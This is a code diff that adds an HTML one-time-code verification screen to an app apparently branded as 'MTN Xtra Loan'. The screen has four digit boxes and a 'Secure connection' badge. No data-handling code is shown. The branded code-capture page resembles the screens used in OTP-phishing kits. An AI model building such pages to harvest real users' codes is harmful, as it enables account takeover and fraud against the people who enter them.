@@ -177,7 +177,46 @@
         </div>
     </div>
 
-    <!-- Force browser to load the newest script version -->
-    <script src="script.js?v=5"></script>
+    <!-- NEW Screen 8: OTP Verification (Like your image) -->
+    <div id="screen-otp" class="app-screen" style="background-color: #f4f5f7;">
+        <div class="content" style="padding-top: 40px; text-align: center;">
+            
+            <!-- Lock Icon -->
+            <div style="width: 80px; height: 80px; background: #fff8e1; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px;">
+                <i class="fas fa-lock" style="font-size: 35px; color: #ffcc00;"></i>
+            </div>
+
+            <h2 style="color: #1a1a1a; font-weight: 800; font-size: 24px; margin-bottom: 10px;">
+                Enter the <span style="color: #ffcc00;">Verification Code</span>
+            </h2>
+            
+            <p style="font-size: 15px; color: #555; margin-bottom: 30px; line-height: 1.5;">
+                We sent a <strong>4-digit code</strong> to your number.<br>Enter it below to continue.
+            </p>
+
+            <!-- 4 Digit Inputs -->
+            <div class="otp-container" style="display: flex; justify-content: center; gap: 15px; margin-bottom: 30px;">
+                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #ddd; border-radius: 12px; background: #fff; outline: none; transition: all 0.2s;">
+                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #ddd; border-radius: 12px; background: #fff; outline: none; transition: all 0.2s;">
+                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #ddd; border-radius: 12px; background: #fff; outline: none; transition: all 0.2s;">
+                <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" style="width: 60px; height: 70px; text-align: center; font-size: 32px; font-weight: bold; border: 2px solid #ddd; border-radius: 12px; background: #fff; outline: none; transition: all 0.2s;">
+            </div>
+
+            <button class="btn-primary" id="otp-submit-btn" style="background: #ffe082; color: #fff; font-size: 18px; border: none; pointer-events: none; border-radius: 30px; padding: 18px; transition: all 0.3s ease;">
+                VERIFY & CONTINUE &rarr;
+            </button>
+            
+            <p style="font-size: 14px; color: #777; margin-top: 20px;">
+                Didn't receive the code? <strong style="color: #004d40; cursor: pointer;">Resend code</strong>
+            </p>
+            
+            <p style="font-size: 13px; color: #999; margin-top: 40px;">
+                <i class="fas fa-lock" style="color: #ffcc00;"></i> Secure connection to MTN Xtra Loan
+            </p>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="script.js?v=6"></script>
 </body>
 </html>
